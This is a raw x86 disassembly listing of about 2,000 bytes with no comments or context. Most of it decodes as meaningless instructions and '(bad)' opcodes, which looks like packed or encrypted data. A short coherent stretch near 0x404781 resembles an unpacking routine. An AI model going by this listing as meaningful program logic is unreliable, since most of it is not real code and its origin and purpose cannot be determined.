  4041f4:	aaa    
  4041f5:	test   al,0x86
  4041f7:	lahf   
  4041f8:	xchg   ebp,eax
  4041f9:	mov    esp,0x531adf0d
  4041fe:	jecxz  0x40426b
  404200:	xchg   edi,eax
  404201:	jns    0x4041d2
  404203:	fs jp  0x404285
  404206:	inc    ecx
  404207:	in     al,0x9c
  404209:	jge    0x4041af
  40420b:	stos   BYTE PTR es:[edi],al
  40420c:	dec    esi
  40420d:	inc    edx
  40420e:	push   ds
  40420f:	stos   BYTE PTR es:[edi],al
  404210:	jg     0x4041e1
  404212:	jmp    0x2778d714
  404217:	outs   dx,BYTE PTR ds:[esi]
  404218:	pop    ebx
  404219:	mov    dh,0x9a
  40421b:	std    
  40421c:	into   
  40421d:	ffree  st(3)
  40421f:	daa    
  404220:	inc    eax
  404221:	xchg   ecx,eax
  404222:	fdivr  DWORD PTR [ecx-0x15]
  404225:	mov    ds:0xfd63e222,eax
  40422a:	lock push cs
  40422c:	sbb    BYTE PTR [edx-0x5145bab9],dh
  404232:	bnd ret 
  404234:	bound  edi,QWORD PTR [ebx]
  404236:	call   FWORD PTR [edx+0x36]
  404239:	and    eax,0xdcc84460
  40423e:	sbb    eax,0xd3536b69
  404243:	shl    eax,0xb4
  404246:	(bad)  
  404247:	push   DWORD PTR [edx]
  404249:	fimul  DWORD PTR [esi]
  40424b:	(bad)  
  40424c:	cli    
  40424d:	jns    0x404277
  40424f:	cmp    al,0x66
  404251:	imul   edx,DWORD PTR [esi],0x2f
  404254:	xchg   ebp,eax
  404255:	(bad)  
  404258:	loopne 0x404278
  40425a:	js     0x4042c5
  40425c:	retf   0xdb4f
  40425f:	test   edi,0x254b8e17
  404265:	leave  
  404266:	fidiv  WORD PTR [esi+ecx*2]
  404269:	pop    esp
  40426a:	jb     0x40424d
  40426c:	(bad)  
  40426d:	mov    al,ch
  40426f:	adc    DWORD PTR [ebp+0x169212f3],0x6c
  404276:	jbe    0x404236
  404278:	sub    DWORD PTR [ebx+0x467d2573],esi
  40427e:	fnsave [esi+0x22]
  404281:	mov    BYTE PTR [edx+ebx*8-0x12],al
  404285:	js     0x40427a
  404287:	sti    
  404288:	mov    DWORD PTR [eax],0x74cef45b
  40428e:	sub    eax,0x684bde59
  404293:	mov    ch,0x1
  404295:	mov    dl,0x22
  404297:	(bad)  
  404299:	dec    eax
  40429a:	add    edi,ecx
  40429c:	jne    0x404293
  40429e:	or     bl,BYTE PTR [esi+0x15a00267]
  4042a4:	add    ebp,DWORD PTR ds:0xee9d31d3
  4042aa:	pop    esp
  4042ab:	pushf  
  4042ac:	ja     0x4042dc
  4042ae:	adc    DWORD PTR [esi],ecx
  4042b0:	xchg   ebx,eax
  4042b1:	jns    0x4042d4
  4042b3:	int    0x57
  4042b5:	pop    esi
  4042b6:	sub    ecx,DWORD PTR [esi+0x336fb1]
  4042bc:	push   eax
  4042bd:	add    esp,DWORD PTR [ebx]
  4042bf:	xchg   ecx,eax
  4042c0:	sub    bh,BYTE PTR [esi+ebx*8]
  4042c3:	out    dx,al
  4042c4:	test   DWORD PTR [ebx],eax
  4042c6:	test   al,0x87
  4042c8:	inc    esp
  4042c9:	xchg   esi,ecx
  4042cb:	mov    edx,?
  4042cd:	or     ecx,DWORD PTR [ebx+0x5c]
  4042d0:	cli    
  4042d1:	cmp    al,0x52
  4042d3:	mov    ds:0xfc4211fe,eax
  4042d8:	push   edx
  4042d9:	adc    BYTE PTR [ecx],bh
  4042db:	pop    esi
  4042dc:	lock pop esp
  4042de:	xchg   esp,eax
  4042df:	out    0xef,al
  4042e1:	push   es
  4042e2:	test   DWORD PTR [edx+0x4732df43],0x9282767
  4042ec:	dec    edi
  4042ed:	sub    DWORD PTR [ecx-0x6a2077d4],0xffffffb3
  4042f4:	jmp    0x7c97:0xd76c0a7f
  4042fb:	or     ebp,esp
  4042fd:	dec    eax
  4042fe:	mov    esi,DWORD PTR [ebx+ebp*2]
  404301:	jno    0x404334
  404303:	sbb    dh,al
  404305:	icebp  
  404306:	xchg   edx,eax
  404307:	repz test DWORD PTR [edx-0x51],0x2b55b369
  40430f:	(bad)  
  404310:	sbb    DWORD PTR [ecx+ecx*8],esi
  404313:	add    BYTE PTR [ebx+0x5e],bh
  404316:	and    ebp,esp
  404318:	jge    0x40433b
  40431a:	fsub   st,st(1)
  40431c:	arpl   ax,di
  40431e:	jb     0x4042ee
  404320:	mov    cl,0x30
  404322:	and    al,BYTE PTR [ebx-0x52]
  404325:	ins    BYTE PTR es:[edi],dx
  404326:	jbe    0x404392
  404328:	loopne 0x4042af
  40432a:	jne    0x40430c
  40432c:	inc    eax
  40432d:	sub    DWORD PTR [esi-0x4996160e],ebp
  404333:	sar    bh,0x5f
  404336:	jmp    0x40434a
  404338:	xor    ecx,DWORD PTR [edx+ebx*2+0xea93b19]
  40433f:	sbb    eax,0x3a61a29a
  404344:	sub    BYTE PTR [eax+ebp*8],dh
  404347:	push   ebx
  404348:	mov    ds:0x6aa57a12,al
  40434d:	push   cs
  40434e:	out    0xe5,eax
  404350:	imul   ebp,esp,0x2d
  404353:	mov    ds:0x944ac3a4,eax
  404358:	loopne 0x404334
  40435a:	scas   al,BYTE PTR es:[edi]
  40435b:	jne    0x404347
  40435d:	sub    eax,0xa721741e
  404362:	mov    ah,0x2a
  404364:	push   ecx
  404365:	daa    
  404366:	cmc    
  404367:	and    al,0x33
  404369:	xor    BYTE PTR [ecx-0x1212686e],al
  40436f:	cmp    bh,al
  404371:	push   eax
  404372:	aam    0x19
  404374:	dec    ecx
  404375:	pusha  
  404376:	jnp    0x4043cc
  404378:	in     al,dx
  404379:	jle    0x4043aa
  40437b:	lods   al,BYTE PTR ds:[esi]
  40437c:	lea    edx,[ebx+ebx*1]
  40437f:	sti    
  404380:	(bad)  
  404381:	mov    ecx,0x7f182657
  404386:	push   ebx
  404387:	fadd   DWORD PTR [ecx]
  404389:	aaa    
  40438a:	lods   eax,DWORD PTR ds:[esi]
  40438b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40438c:	add    al,0xb3
  40438e:	inc    ecx
  40438f:	adc    esp,esp
  404391:	jl     0x4043a7
  404393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404394:	lods   al,BYTE PTR ds:[esi]
  404395:	leave  
  404396:	(bad)  
  404398:	(bad)  [eax+0x7c]
  40439b:	test   ax,0x2235
  40439f:	aam    0x6f
  4043a1:	sbb    al,0xc0
  4043a3:	cs into 
  4043a5:	out    dx,al
  4043a6:	mov    edx,0xf508e910
  4043ab:	mov    eax,0xf22cff95
  4043b0:	pop    esi
  4043b1:	inc    ebx
  4043b2:	pop    esi
  4043b3:	mov    esp,0x2fd470ac
  4043b8:	js     0x404408
  4043ba:	xchg   edi,eax
  4043bb:	outs   dx,DWORD PTR ds:[esi]
  4043bc:	scas   al,BYTE PTR es:[edi]
  4043bd:	pop    es
  4043be:	add    al,0xc7
  4043c0:	mov    ebp,0x6a9302d9
  4043c5:	push   ecx
  4043c6:	add    BYTE PTR [esi-0x2c2230a9],bh
  4043cc:	retf   0x2c7e
  4043cf:	mov    ds:0x4fec7bec,eax
  4043d4:	lods   eax,DWORD PTR cs:[esi]
  4043d6:	popa   
  4043d7:	push   esi
  4043d8:	sbb    al,0x10
  4043da:	lahf   
  4043db:	fnsave [ebx]
  4043dd:	ins    DWORD PTR es:[edi],dx
  4043de:	(bad)  
  4043df:	or     BYTE PTR [ebx+0x11],cl
  4043e2:	add    al,0xef
  4043e4:	js     0x404415
  4043e6:	cs jmp 0x40443e
  4043e9:	(bad)  
  4043eb:	inc    eax
  4043ec:	pop    edx
  4043ed:	cmovo  esi,esi
  4043f0:	mov    ch,BYTE PTR [edi]
  4043f2:	mov    ebp,ebx
  4043f4:	sbb    DWORD PTR [ebx+0x11],0x104f5377
  4043fb:	sbb    DWORD PTR [ebx+0x24],0xc7162ea9
  404402:	in     al,dx
  404403:	pop    ebx
  404404:	fwait
  404405:	push   esi
  404406:	out    0xba,eax
  404408:	mov    esi,0xb78d87eb
  40440d:	ins    DWORD PTR es:[edi],dx
  40440e:	mov    bl,0x1
  404410:	lahf   
  404411:	add    al,BYTE PTR [eax]
  404413:	in     eax,dx
  404414:	pop    esp
  404415:	pop    es
  404416:	addr16 cwde 
  404418:	retf   
  404419:	dec    eax
  40441a:	mov    ecx,0x7e63654a
  40441f:	pop    esi
  404420:	popf   
  404421:	xchg   ecx,eax
  404422:	xor    esp,DWORD PTR [edi-0x5df1491]
  404428:	mov    BYTE PTR [eax+0x17],0xa9
  40442c:	dec    esi
  40442d:	shr    BYTE PTR [ecx],1
  40442f:	push   0x1701b2b5
  404434:	and    eax,edi
  404436:	dec    ebp
  404437:	xlat   BYTE PTR ds:[ebx]
  404438:	in     al,0xe6
  40443a:	repnz mov bh,0xa3
  40443d:	bound  edx,QWORD PTR [esi-0x77]
  404440:	icebp  
  404441:	popa   
  404442:	mov    cl,0xe5
  404444:	push   ds
  404445:	int3   
  404446:	pop    eax
  404447:	inc    edi
  404448:	or     eax,0x767b9025
  40444d:	hlt    
  40444e:	repnz sahf 
  404450:	lods   al,BYTE PTR ds:[esi]
  404451:	sub    al,0xb0
  404453:	sbb    ecx,edx
  404455:	imul   esi,ebx,0x23
  404458:	ja     0x40445f
  40445a:	xchg   BYTE PTR [edx+0x347992bc],ah
  404460:	in     al,0x36
  404462:	jg     0x4044d0
  404464:	test   al,0x4a
  404466:	mov    eax,0xf199f7fc
  40446b:	out    dx,eax
  40446c:	int    0x75
  40446e:	scas   al,BYTE PTR es:[edi]
  40446f:	iret   
  404470:	mov    al,0x34
  404472:	adc    DWORD PTR [esi],eax
  404474:	sbb    bh,BYTE PTR [ecx-0x7b]
  404477:	(bad)  
  404479:	mov    dh,0xf4
  40447b:	shl    DWORD PTR [ebx],cl
  40447d:	clc    
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40442c
  404490:	(bad)  
  404491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404492:	adc    ebx,DWORD PTR [esi+0x18]
  404495:	jle    0x404515
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x40448b
  40449c:	push   es
  40449d:	jne    0x404451
  40449f:	mov    ds:0x8813dc05,eax
  4044a4:	retf   0x2b11
  4044a7:	push   es
  4044a8:	scas   eax,DWORD PTR es:[edi]
  4044a9:	rcl    BYTE PTR [edi-0x3d],1
  4044ac:	or     DWORD PTR [ebx],ebp
  4044ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044af:	iret   
  4044b0:	mov    esp,ebx
  4044b2:	iret   
  4044b3:	mov    edx,0xcd13af60
  4044b8:	jne    0x4044a3
  4044ba:	ja     0x4044dd
  4044bc:	sub    DWORD PTR ds:[ecx-0x6a],ebp
  4044c0:	add    al,0x66
  4044c2:	out    dx,al
  4044c3:	test   al,0x9e
  4044c5:	jecxz  0x404523
  4044c7:	imul   edi,DWORD PTR [ebx-0x17],0x1f
  4044cb:	test   dl,dl
  4044cd:	sub    dh,BYTE PTR [ebx+esi*1+0x3bd67343]
  4044d4:	stos   DWORD PTR es:[edi],eax
  4044d5:	mov    al,ss:0x39ec8c70
  4044db:	mov    edi,0x888d1636
  4044e0:	mov    dh,0xaf
  4044e2:	push   esi
  4044e3:	jp     0x404557
  4044e5:	mov    cl,BYTE PTR [ecx+eax*2+0x5d6e087a]
  4044ec:	jno    0x4044c0
  4044ee:	es mov edi,0xf5c9338c
  4044f4:	inc    edi
  4044f5:	push   0x1041ddf5
  4044fa:	xchg   edx,eax
  4044fb:	push   es
  4044fc:	cmp    dl,BYTE PTR [ecx-0x18]
  4044ff:	ret    0x7178
  404502:	adc    DWORD PTR [esi-0x2b],esi
  404505:	adc    BYTE PTR [ecx+ecx*4+0x1e],ah
  404509:	mov    bl,0xb9
  40450b:	cld    
  40450c:	mov    eax,ds:0xcde74228
  404511:	jge    0x40452b
  404513:	js     0x404561
  404515:	fist   WORD PTR [esi]
  404517:	stos   BYTE PTR es:[edi],al
  404518:	fucomi st,st(3)
  40451a:	in     eax,0xae
  40451c:	fistp  QWORD PTR [ebp-0x4]
  40451f:	xchg   edx,eax
  404520:	push   edx
  404521:	(bad)  
  404522:	adc    BYTE PTR [ecx],ch
  404524:	iret   
  404525:	mov    edx,0x8e8fe97a
  40452a:	lock push cs
  40452c:	jp     0x404595
  40452e:	push   0x39f82538
  404533:	mov    ds:0xfd314a71,al
  404538:	inc    edi
  404539:	popf   
  40453a:	adc    al,0x32
  40453c:	mov    bl,0x26
  40453e:	add    BYTE PTR [eax],0x7a
  404541:	adc    al,0x50
  404543:	cld    
  404544:	rol    BYTE PTR ds:0xf1811797,0x1e
  40454b:	aad    0xad
  40454d:	lahf   
  40454e:	fwait
  40454f:	in     eax,0x5a
  404551:	call   0xb111109c
  404556:	fwait
  404557:	push   edx
  404558:	test   al,0xd
  40455a:	mov    DWORD PTR [ebx-0x1836df75],ecx
  404560:	in     eax,dx
  404561:	jmp    0x404537
  404563:	cmp    dl,BYTE PTR [eax+0x14]
  404566:	nop
  404567:	cmp    eax,0x6250acda
  40456c:	jp     0x404527
  40456e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40456f:	sbb    ebx,DWORD PTR [edx-0x37]
  404572:	xchg   dl,ah
  404574:	retf   0xbfd6
  404577:	mov    ecx,0x6d19bd6c
  40457c:	aas    
  40457d:	add    al,0x29
  40457f:	pop    ebx
  404580:	repnz out 0xed,al
  404583:	push   edx
  404584:	mov    cl,0xb9
  404586:	push   edi
  404587:	adc    eax,0x452329ef
  40458c:	pop    gs
  40458e:	sub    esp,DWORD PTR [edi-0x7f]
  404591:	iret   
  404592:	div    BYTE PTR [ecx+0x3ffc800c]
  404598:	rol    BYTE PTR [ecx-0x5e],cl
  40459b:	ror    cl,cl
  40459d:	(bad)  
  40459e:	outs   dx,DWORD PTR ds:[esi]
  40459f:	(bad)  
  4045a0:	and    ah,al
  4045a2:	shr    ebp,0xed
  4045a5:	clc    
  4045a6:	inc    ebp
  4045a7:	xor    DWORD PTR [eax+0x16ab2fea],0xffffff86
  4045ae:	push   ebp
  4045af:	mov    dh,0x87
  4045b1:	test   al,0x3a
  4045b3:	or     DWORD PTR [ebp-0x66],0xa53a0335
  4045ba:	mov    eax,0x9b347504
  4045bf:	jp     0x4045e6
  4045c1:	dec    ebp
  4045c2:	jg     0x4045c8
  4045c4:	dec    ebx
  4045c5:	popf   
  4045c6:	popa   
  4045c7:	add    al,0xf
  4045ca:	inc    edx
  4045cb:	je     0x404565
  4045cd:	leave  
  4045ce:	(bad)  
  4045d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d1:	dec    ebp
  4045d2:	mov    ch,0x4a
  4045d4:	test   BYTE PTR [edx],al
  4045d6:	punpckhbw mm2,QWORD PTR [edx-0x1f5a1ae8]
  4045dd:	pop    es
  4045de:	push   ds
  4045df:	dec    ebp
  4045e0:	inc    ecx
  4045e1:	add    dl,BYTE PTR [edi+0x67ae0b7c]
  4045e7:	jle    0x404628
  4045e9:	out    dx,eax
  4045ea:	in     eax,0xf2
  4045ec:	pop    eax
  4045ed:	loopne 0x404667
  4045ef:	es pop ds
  4045f1:	push   esp
  4045f2:	mov    edx,0x686eeffe
  4045f7:	iret   
  4045f8:	and    eax,0x37406f8
  4045fd:	les    esi,FWORD PTR [edx-0x5d]
  404600:	push   0x7f897ba8
  404605:	adc    DWORD PTR [ebx],ecx
  404607:	add    DWORD PTR [ebp+0x35],ebx
  40460a:	das    
  40460b:	xchg   edx,ecx
  40460d:	scas   eax,DWORD PTR es:[edi]
  40460e:	fimul  WORD PTR [edi-0x15]
  404611:	adc    bl,ah
  404613:	push   edx
  404614:	xor    ebx,DWORD PTR [ecx]
  404616:	mov    ebx,cs
  404618:	dec    esi
  404619:	test   DWORD PTR [ebx],eax
  40461b:	pop    es
  40461c:	ret    0x81af
  40461f:	mov    eax,0x3d2ef53
  404624:	jecxz  0x4045c2
  404626:	cmp    edi,edi
  404628:	test   BYTE PTR [edi-0x51606938],dl
  40462e:	arpl   WORD PTR [ebx-0x60],sp
  404631:	xor    eax,0x3c2cb8ee
  404636:	push   ebp
  404637:	out    0x96,eax
  404639:	rcr    BYTE PTR [edx+0x73bc0c0d],1
  40463f:	ret    0x7794
  404642:	mov    ds:0xff4c7920,eax
  404647:	test   dh,0xd5
  40464a:	adc    esi,DWORD PTR [eax]
  40464c:	in     al,0x2
  40464e:	mov    ah,0xa5
  404650:	sub    BYTE PTR [ebx],ch
  404652:	addr16 cmp al,bl
  404655:	sbb    DWORD PTR [eax],edi
  404657:	or     bl,BYTE PTR [eax-0x620137e0]
  40465d:	mov    WORD PTR [esi],es
  40465f:	imul   BYTE PTR [esi+edx*8]
  404662:	sbb    al,0x1a
  404664:	xchg   esp,eax
  404665:	sbb    ch,BYTE PTR [ebx+eax*1-0xbdab6a8]
  40466c:	leave  
  40466d:	push   edi
  40466e:	adc    DWORD PTR [edi-0x6108ee5a],0xffffffe8
  404675:	jg     0x4046d8
  404677:	int3   
  404678:	adc    DWORD PTR [eax+0x2e],ecx
  40467b:	or     eax,0x4acf43e1
  404680:	mov    al,0xaa
  404682:	sub    al,0xf8
  404684:	(bad)  [ebp-0x7c]
  404687:	fadd   DWORD PTR [edi+0x20e9dc7]
  40468d:	out    dx,al
  40468e:	dec    esp
  40468f:	jg     0x4046de
  404691:	fidivr DWORD PTR [edx]
  404693:	push   cs
  404694:	sahf   
  404695:	aaa    
  404696:	inc    ebx
  404697:	mov    eax,ds:0xdafc87e1
  40469c:	mov    ah,0xbc
  40469e:	push   0xfffffffd
  4046a0:	or     ebx,ecx
  4046a2:	dec    esi
  4046a3:	(bad)
  4046a7:	imul   esi,DWORD PTR [edi-0x4c],0x33
  4046ab:	mov    ah,bh
  4046ad:	pusha  
  4046ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046af:	in     eax,0xef
  4046b1:	icebp  
  4046b2:	shl    eax,1
  4046b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046b5:	dec    edx
  4046b6:	inc    edi
  4046b7:	cmp    BYTE PTR [esi+edx*2-0x26],bh
  4046bb:	fidivr DWORD PTR [ecx-0x4bea0043]
  4046c1:	or     BYTE PTR [edi],ah
  4046c3:	out    0xcc,al
  4046c5:	jp     0x4046f0
  4046c7:	mov    WORD PTR [eax-0x53e1299f],ds
  4046cd:	int    0xcf
  4046cf:	out    0x7b,al
  4046d1:	sar    DWORD PTR [eax+0x4fefc495],1
  4046d7:	cs addr16 dec ebx
  4046da:	inc    eax
  4046db:	sbb    DWORD PTR [ecx],ebp
  4046dd:	imul   edi,esi,0xffffffdc
  4046e0:	xchg   esp,eax
  4046e1:	xor    ecx,DWORD PTR [ebx]
  4046e3:	dec    edi
  4046e4:	add    al,0x1f
  4046e6:	bound  esp,QWORD PTR [eax]
  4046e8:	push   ebx
  4046e9:	nop
  4046ea:	jle    0x40467b
  4046ec:	mov    ecx,0xe5d74134
  4046f1:	test   eax,0x621574c4
  4046f6:	or     ecx,DWORD PTR [eax+eax*8+0x4d6ec87]
  4046fd:	mov    eax,0x7c0471d9
  404702:	stos   BYTE PTR es:[edi],al
  404703:	mov    ds:0x400197e9,eax
  404708:	dec    esi
  404709:	adc    al,0xd8
  40470b:	ins    DWORD PTR es:[edi],dx
  40470c:	pop    esi
  40470d:	dec    eax
  40470e:	cmc    
  40470f:	lds    edx,FWORD PTR [ecx+0x65]
  404712:	(bad)  
  404713:	xchg   esp,eax
  404714:	es cs test al,0x55
  404718:	sbb    ebx,DWORD PTR [edx-0x53826800]
  40471e:	jp     0x4046ca
  404720:	icebp  
  404721:	lods   al,BYTE PTR ds:[esi]
  404722:	cmp    eax,0xd226c7c1
  404727:	pop    ds
  404728:	das    
  404729:	dec    ebp
  40472a:	clc    
  40472b:	adc    al,0x87
  40472d:	imul   edi,DWORD PTR [esi],0xffffffbd
  404730:	hlt    
  404731:	cs sub cl,0xb3
  404735:	and    ecx,DWORD PTR [ebx-0x234f04b4]
  40473b:	sub    al,0x9e
  40473d:	pop    es
  40473e:	push   ebp
  40473f:	mov    ds:0xdae393b4,eax
  404744:	cmp    eax,0xe3212b6d
  404749:	(bad)  
  40474b:	cwde   
  40474c:	push   0x704b0a7f
  404751:	das    
  404752:	xchg   edx,eax
  404753:	fsub   QWORD PTR [ecx-0x6967d8]
  404759:	ja     0x4047cf
  40475b:	stos   DWORD PTR es:[edi],eax
  40475c:	or     BYTE PTR [ebx+0x7d],0x64
  404760:	push   ecx
  404761:	mov    cl,0xa6
  404763:	mov    dh,0x9
  404765:	ret    0xbde8
  404768:	push   ecx
  404769:	mov    ecx,0x43cb7a95
  40476e:	sub    edi,esp
  404770:	and    DWORD PTR [ebp-0xb],esp
  404773:	xchg   ebp,eax
  404774:	in     al,0x6a
  404776:	xor    eax,0x44867b5d
  40477b:	jle    0x404754
  40477d:	adc    eax,ebx
  40477f:	jo     0x4047c2
  404781:	xor    edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	or     al,0xdd
  4047b6:	inc    ecx
  4047b7:	lds    edi,FWORD PTR [eax+0x587e7e27]
  4047bd:	jl     0x40483d
  4047bf:	jle    0x40482c
  4047c1:	push   0x29
  4047c3:	arpl   di,ax
  4047c5:	mov    dh,0x26
  4047c7:	inc    esi
  4047c8:	es not ah
  4047cb:	scas   eax,DWORD PTR es:[edi]
  4047cc:	mov    bh,0x66
  4047ce:	test   al,0x9a
  4047d0:	adc    dh,BYTE PTR ds:0xa4c29b2
  4047d6:	or     cl,dl
  4047d8:	aas    
  4047d9:	push   edx
  4047da:	out    0x69,eax
  4047dc:	inc    ebp
  4047dd:	adc    esp,ebx
  4047df:	imul   ebx,edi,0x218ee5e6
  4047e5:	aad    0x8a
  4047e7:	(bad)  
  4047e9:	cmc    
  4047ea:	gs add cl,dh
  4047ed:	mov    ebp,?
  4047ef:	js     0x4047f9
  4047f1:	jmp    0x57e0:0xd779ed68
  4047f8:	jecxz  0x4047b5
  4047fa:	dec    ecx
  4047fb:	out    dx,al
  4047fc:	and    eax,DWORD PTR [edx+ebp*1+0x6b9ec488]
  404803:	mov    esp,0xfb478038
  404808:	fs mov ebx,0xca56a6d2
  40480e:	out    0x44,al
  404810:	adc    eax,0xd8db9085
  404815:	mov    ebx,0xe8bcc88
  40481a:	pop    ebx
  40481b:	loop   0x4047d5
  40481d:	mov    ch,0x41
  40481f:	inc    edi
  404820:	add    al,0x6c
  404822:	jmp    0x431a446e
  404827:	fucom  st(3)
  404829:	cmp    al,0x73
  40482b:	jl     0x404812
  40482d:	pop    ss
  40482e:	mov    ch,0xaa
  404830:	sbb    al,0xad
  404832:	pop    es
  404833:	inc    ecx
  404834:	mov    bl,cl
  404836:	leave  
  404837:	xchg   BYTE PTR [edx+0xf4fa17a],bl
  40483d:	dec    eax
  40483e:	popa   
  40483f:	std    
  404840:	scas   eax,DWORD PTR es:[edi]
  404841:	cmp    BYTE PTR [edi],bh
  404843:	sahf   
  404844:	clc    
  404845:	mov    ds:0x65db4028,eax
  40484a:	cdq    
  40484b:	and    al,0xd8
  40484d:	scas   al,BYTE PTR es:[edi]
  40484e:	scas   eax,DWORD PTR es:[edi]
  40484f:	rol    DWORD PTR [eax],0xe3
  404852:	(bad)  
  404853:	fisttp QWORD PTR ds:0x1deb4ab2
  404859:	sbb    eax,0x342717c8
  40485e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40485f:	or     DWORD PTR [esi],0xffffffc1
  404862:	cmp    BYTE PTR [eax-0x2e37d675],ch
  404868:	cdq    
  404869:	xor    eax,0xbfae35cd
  40486e:	addr16 push edx
  404870:	adc    edi,ebp
  404872:	shl    BYTE PTR [ebx],0xc4
  404875:	test   eax,0x12e8150c
  40487a:	jnp    0x4048e3
  40487c:	cmp    ah,al
  40487e:	fbld   TBYTE PTR [ebx+0x76aceb03]
  404884:	in     eax,dx
  404885:	sbb    eax,0x4071eb84
  40488a:	cmovg  esi,DWORD PTR [ebp+0x1c777227]
  404891:	push   0x6d1f8068
  404896:	je     0x4048c0
  404898:	ffreep st(4)
  40489a:	ss xchg edi,eax
  40489c:	inc    esi
  40489d:	xlat   BYTE PTR ds:[ebx]
  40489e:	inc    ebx
  40489f:	lds    edi,FWORD PTR [ebx+0x7365098c]
  4048a5:	jp     0x4048f6
  4048a7:	xchg   ecx,edi
  4048a9:	add    eax,0x2d357bdc
  4048ae:	xor    edi,esi
  4048b0:	mov    edi,0x52ef5bda
  4048b5:	jbe    0x404919
  4048b7:	jbe    0x4048e4
  4048b9:	retf   
  4048ba:	sbb    bh,BYTE PTR [ecx+0x2]
  4048bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048be:	imul   ebp,eax,0x4a78ffd2
  4048c4:	mov    ecx,0xd5df26c1
  4048c9:	retf   0x8f22
  4048cc:	mov    ecx,0xe8e48d3e
  4048d1:	add    eax,0x804ae292
  4048d6:	mov    DWORD PTR [ecx],esp
  4048d8:	fadd   DWORD PTR [ebx]
  4048da:	ja     0x404913
  4048dc:	clc    
  4048dd:	aam    0xed
  4048df:	(bad)  
  4048e1:	mov    eax,0x6763abf6
  4048e6:	idiv   DWORD PTR [edi+ebp*8-0x9104db3]
  4048ed:	ds stos DWORD PTR es:[edi],eax
  4048ef:	adc    BYTE PTR [esi+ecx*4],cl
  4048f2:	sahf   
  4048f3:	and    eax,0x47016d79
  4048f8:	mov    bh,0x84
  4048fa:	retf   0x9aaa
  4048fd:	xor    dl,BYTE PTR ds:0x9bead036
  404903:	mov    bh,BYTE PTR [eax]
  404905:	pop    esi
  404906:	fadd   DWORD PTR [ebx]
  404908:	sub    eax,0x4d9ea04b
  40490d:	outs   dx,DWORD PTR ds:[esi]
  40490e:	adc    al,0x52
  404910:	sub    dl,BYTE PTR [edi]
  404912:	enter  0x69d2,0xfd
  404916:	in     al,0x4d
  404918:	add    BYTE PTR [ecx-0x6d5d56de],dl
  40491e:	pop    ebx
  40491f:	(bad)  
  404920:	test   ecx,edx
  404922:	fdivr  QWORD PTR [edi-0x19]
  404925:	dec    ebx
  404926:	outs   dx,DWORD PTR ds:[esi]
  404927:	mov    dh,0x1c
  404929:	mov    cl,0x40
  40492b:	inc    esp
  40492c:	cmp    DWORD PTR [esi+0x6d],ebp
  40492f:	aam    0x8e
  404931:	push   esp
  404932:	cmp    eax,0xf32cabea
  404937:	jle    0x404924
  404939:	fwait
  40493a:	in     al,0xf2
  40493c:	scas   eax,DWORD PTR es:[edi]
  40493d:	arpl   WORD PTR [edi],dx
  40493f:	jns    0x404900
  404941:	call   0xfafd:0x71643305
  404948:	sti    
  404949:	fild   QWORD PTR [esi]
  40494b:	pop    ecx
  40494c:	xchg   ecx,eax
  40494d:	mov    bh,0xc9
  40494f:	fs loope 0x404946
  404952:	data16 fcomp DWORD PTR [esi+0x41]
  404956:	cwde   
  404957:	push   ecx
  404958:	mov    esp,0x28f89550
  40495d:	call   0x74c7:0xd282b680
  404964:	adc    ecx,0xf8b3c645
  40496a:	ret    0x3120
  40496d:	test   dh,cl
  40496f:	pop    ds
  404970:	mov    ecx,0xb7a154a7
  404975:	pop    eax
  404976:	jecxz  0x404929
  404978:	push   esp
  404979:	pop    es
  40497a:	jns    0x40495c
  40497c:	ins    BYTE PTR es:[edi],dx
  40497d:	jmp    0x4049da
  40497f:	addr16 push edi
  404981:	mov    ebx,0x92875419
  404986:	or     eax,0x27f298dd
  40498b:	mov    edx,DWORD PTR [ebp+0xebca5b0]
  404991:	pop    ecx
  404992:	ins    DWORD PTR es:[edi],dx
  404993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404994:	mov    DWORD PTR [ebp-0x68],0x5c9115cf
  40499b:	ss popf 
  40499d:	dec    edx
  40499e:	xchg   BYTE PTR [ebx-0x65],al
  4049a1:	ror    BYTE PTR [ebx-0x1e73acf1],0xf6
  4049a8:	loope  0x4049d0
  4049aa:	or     DWORD PTR [ebx-0x3716777a],eax
  4049b0:	mov    edi,0xaaa6bc90
  4049b5:	fld    st(3)
  4049b7:	lods   al,BYTE PTR ds:[esi]
  4049b8:	mov    ah,0xda
  4049ba:	mov    dl,0xd1
  4049bc:	mov    dh,0x3
  4049be:	in     al,0x25
  4049c0:	ins    BYTE PTR es:[edi],dx
  4049c1:	xchg   BYTE PTR ds:0xcc6664eb,al
  4049c7:	or     BYTE PTR [ecx-0x73],cl
  4049ca:	fs xor dh,dh
  4049cd:	jns    0x4049df
  4049cf:	enter  0xbf6e,0xe0
  4049d3:	jge    0x4049cf
  4049d5:	js     0x404962
  4049d7:	mov    ecx,0xf3fa363d
  4049dc:	push   DWORD PTR [ebx-0x7f]
  4049df:	xchg   ebx,eax
  4049e0:	loop   0x4049c4
  4049e2:	mov    al,0xd7
  4049e4:	adc    al,0x65
  4049e6:	dec    esi
